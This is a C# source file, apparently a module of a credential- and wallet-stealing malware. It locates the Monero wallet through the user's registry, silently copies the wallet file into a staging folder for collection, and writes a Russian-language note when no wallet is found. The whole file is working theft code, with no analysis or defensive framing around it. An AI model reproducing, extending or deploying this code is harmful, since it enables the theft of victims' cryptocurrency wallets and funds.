using Microsoft.Win32;
using System.IO;

internal class BTCMON
{
	public static void Start()
	{
		string text = $"{Buffer.path_l}BTC-Monero";
		try
		{
			if (!Directory.Exists(text))
			{
				Directory.CreateDirectory(text);
			}
			RegistryKey registryKey = Registry.CurrentUser.OpenSubKey("Software").OpenSubKey("monero-project").OpenSubKey("monero-core");
			if (registryKey.GetValue("wallet_path") != null)
			{
				string text2 = registryKey.GetValue("wallet_path").ToString();
				if (File.Exists(text2))
				{
					File.Copy(text2, $"{text}\\{Path.GetFileName(text2)}", overwrite: true);
					Buffer.XBufferData[16] = "1";
				}
			}
			registryKey.Close();
		}
		catch
		{
		}
		if (Directory.GetFiles(text).Length == 0)
		{
			File.WriteAllText($"{text}\\info.txt", $"{Buffer.head}Monero не найден на компьютере.");
			Buffer.XBufferData[16] = "0";
		}
	}
}
